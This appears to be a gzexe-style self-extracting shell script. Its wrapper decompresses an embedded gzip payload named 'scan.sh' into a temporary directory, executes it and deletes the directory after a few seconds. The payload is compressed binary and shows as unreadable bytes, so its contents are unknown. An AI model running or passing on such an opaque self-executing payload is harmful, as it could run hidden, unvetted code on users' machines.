#!/bin/sh
skip=44

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -dt`
else
  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `echo X | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  echo >&2 "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�:3`scan.sh �T_O�P^?ű4�Įl11a���H����Εtm��3G0�B@F�b�!A�20>Ȕ����-O|oo��4&�%�=�?��9�ގS�mU�n�8�\��b��ٷ�-���T��ȚtBd�c��C��a���.EC��aE�;�E�Q�`#l�(C�Nأv��!�"%g���w����ѭM�yOf���Ww�[.��Ϝ�o�D�g�XCȄf��1�J����!yDx���db��2�?
3xO������Y^&sϏv8j����M&�ȇi��)��}��`[�����p��[B�P�gn�B[ 4� �{��V�yְ��S�D'�F2ɴz1��>#T�i����HWW<�\��W<Q��=z�ةUn����9x�U������1p+��J�#��r��:�0����N9<a�ڧ�(l�R�41��#� ����H�E[�#�`C�<�<�;��|w7������?88@�}���}F���������ۜ��"�!��G�zi(��u	���w���fH���ΚS�ʠ���:��l��?��17)�4��#:D:��(i����t�L4��-��ߎ�!x�C��ٗ���m�zи�mPw6�U�w�x[:I���j���?�?��x��:{�ˏNm���&m����d����W�ןB�HֺS��-��$4ިz�?�f�W-������C����h)��}���a�B6Ђ��̄���1���]^�*���i2�<z�Xi�p�'�^kR}M�fo$��Mpg���[o������"c�G�[���\,�b�Pr�t����T�Pq6�b�E�5�!�X�a�z���Uoe3� � x��q	c�����
cN�/D���  